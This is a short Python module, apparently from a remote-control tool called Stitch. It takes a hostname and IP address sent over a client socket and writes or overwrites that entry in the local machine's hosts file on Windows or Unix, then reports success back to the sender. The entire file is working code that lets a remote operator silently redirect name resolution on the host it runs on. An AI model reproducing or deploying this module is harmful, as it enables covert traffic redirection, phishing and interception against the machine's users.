# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
# Based heavily off of Jason Vanzin:
# https://github.com/jasonvanzin/hostfileupdate/blob/master/hostfileupdate.py

system = sys.platform
if win_client():
    hosts_file = 'C:\\Windows\\System32\\drivers\\etc\\hosts'
else:
    hosts_file = '/etc/hosts'

def host_exists(hostname,hosts):
    with open(hosts, 'rb') as h:
        for line in h:
            if hostname in line:
                return True
    return False

def add_host(host_entry,hosts):
    try:
        with open(hosts, 'a') as h:
            h.write(host_entry)
        return True,None
    except Exception as e:
        return False,str(e)

def update_host(hostname,host_entry,hosts):
    old_line = ''
    try:
        with open(hosts, 'rb') as h:
            data = h.readlines()
        for index, n in enumerate(data):
            if n.strip().endswith(hostname):
                data[index] = host_entry
                break
        with open(hosts, 'wb') as h:
            h.writelines(data)
        return True,None
    except Exception as e:
        return False,str(e)

def validateIP(ipaddress):
    parts = ipaddress.split(".")
    if len(parts) != 4: return False
    if ipaddress[-1] == '.': return False
    for item in parts:
        if not 0 <= int(item) <= 255:
            return False
    return True

def validateHostname(hostname):
    if len(hostname) > 255 or len(hostname) < 5: return False
    if hostname[0].isdigit(): return False
    if hostname[-1:] == ".": hostname = hostname[:-1]
    allowed = re.compile("(?!-)[A-Z\d-]{1,63}(?<!-)$", re.IGNORECASE)
    return all(allowed.match(x) for x in hostname.split("."))

hostname = receive(client_socket)
ipaddress = receive(client_socket)
entry = "\n{0:20}{1}\n".format(ipaddress, hostname)
entry_update = "{0:20}{1}\n".format(ipaddress, hostname)

if not validateIP(ipaddress):
    resp = '[!] "{}" is not a valid IP address.\n'.format(ipaddress)
elif not validateHostname(hostname):
    resp = '[!] "{}" is not a valid hostname.\n'.format(hostname)
elif host_exists(hostname,hosts_file):
    success, err = update_host(hostname,entry_update,hosts_file)
    if success and not err:
        resp = '[+] Successfully updated "{}" to {}\n'.format(hostname,ipaddress)
    else:
        resp = '[!] ERROR: {}\n'.format(err)
else:
    success, err = add_host(entry,hosts_file)
    if success and not err:
        resp = '[+] Successfully added "{}" to "{}"\n'.format(hostname,hosts_file)
    else:
        resp = '[!] ERROR: {}\n'.format(err)
send(client_socket,resp)
